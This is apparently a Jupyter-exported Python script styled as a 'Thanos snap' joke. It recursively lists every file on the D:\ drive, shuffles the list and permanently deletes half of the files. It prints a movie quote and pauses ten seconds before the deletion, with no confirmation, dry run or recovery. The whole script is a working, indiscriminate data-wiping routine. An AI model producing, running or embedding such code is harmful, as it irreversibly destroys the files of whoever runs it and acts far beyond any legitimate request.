#!/usr/bin/env python
# coding: utf-8

# In[4]:


import random
import os
import time

def snap(path):
    
    all_files = []
    
    for root, dirs, files in os.walk(path):
        for filename in files:
            file = os.path.join(root,filename)
            abs_path = os.path.abspath(file)
            all_files.append(abs_path)
            
    random.shuffle(all_files)
    
    for i in range(len(all_files)//2):
        os.remove(all_files[i])
        
path = "D:\\"
print("Thanos is here, Reality is often disappointing......")
time.sleep(10)
print("snapped.!!")
snap(path)


# In[ ]:




